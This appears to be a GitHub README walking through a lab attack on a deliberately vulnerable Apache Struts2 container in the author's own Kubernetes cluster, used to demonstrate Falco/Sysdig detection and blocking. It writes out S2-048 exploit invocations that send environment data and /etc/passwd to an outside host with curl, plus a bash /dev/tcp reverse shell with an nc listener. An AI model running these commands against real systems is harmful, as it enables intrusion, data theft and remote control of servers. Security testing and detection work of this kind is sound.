# struts_poc  
all credit to https://github.com/hook-s3c/apache-struts2-PoC  

![image](https://user-images.githubusercontent.com/4404271/153259381-52907b2b-ab78-4699-bde6-0cf7b35393a8.png)

## There are sometimes holes.
## This is nothing more than good old Kali struts poc rev shell in a k8s cluster. Simple.  
## Scroll down for a tldr GIF :-)  

![image](https://user-images.githubusercontent.com/4404271/155650062-66a0d0e0-5091-4dd0-9eb9-cb125d21dddb.png)



git clone https://github.com/hook-s3c/apache-struts2-PoC  
cd apache-struts2-PoC/  
docker build -t struts .  
docker run -it --rm -d -p 8080:8080 struts:latest  
docker tag struts:latest public.ecr.aws/v9f6i2g3/stuff:latest  
#public login to us-west-2 not supported by aws  
aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws  
docker push public.ecr.aws/v9f6i2g3/stuff:latest  
kubectl apply -f strust-deploy-and-service.yaml  
ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC  
  

kubectl get service -n struts  
NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE  
`struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m` 

First, on the cc server, start some simple web server such as: python3 webserver.py  

OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu box):  

`cd ~/apache-struts2-PoC`    
`python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'`  

...and we dump the environment to the CC server, not good!  

KUBERNETES_SERVICE_PORT_HTTPS=443  
KUBERNETES_SERVICE_PORT=443  
STRUTS_PORT_8080_TCP_PORT=8080  
STRUTS_SERVICE_PORT=8080  
HOSTNAME=struts-7d8c95bbbd-9p9pp  
JAVA_HOME=/usr/local/openjdk-8  
GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5  
etc..  
  
OK that was fun, what else can we do? Curl?  

`python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster`  

I wondered if I could modify an existing Falco rule to warn on curl GET? Yes! We can get granular enough to tell the difference between a curl POST and a curl GET that is awesome!  
So, this GET shows up on our little CC web server, and logs in Sysdig as a warning about curl, naughty, but I'll allow it, this time!  

OK now with our confidence sky high, through the roof, let's post the whole dang passwd file to our CC server here we go:  

`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080`  

And believe me, that works! We see the passwd file appearing in our CC server.  
But we want to block it, easy enough, we simply enable a policy with a Falco rule to kill the container iif there is a curl POST  
And it works! The container is killed so quickly, the passwd never shows up on the CC server (I know, I tested it probably a hundred times)  

So now to put the cherry on top, let's do a reverse shell:  
On our CC server let's just listen like so: nc -l 4242  

And then from our attack box let's `python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'`

And let's watch the fun unfold:  

![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)

![image](https://user-images.githubusercontent.com/4404271/153435925-60ccd750-ad11-4f80-ad72-e27f01d75e09.png)

![image](https://user-images.githubusercontent.com/4404271/153497163-7b424dc2-3652-4798-9200-1606fd54876f.png)

![image](https://user-images.githubusercontent.com/4404271/153490296-a07fb685-8b04-48bb-8af0-7bff11cc2c21.png)

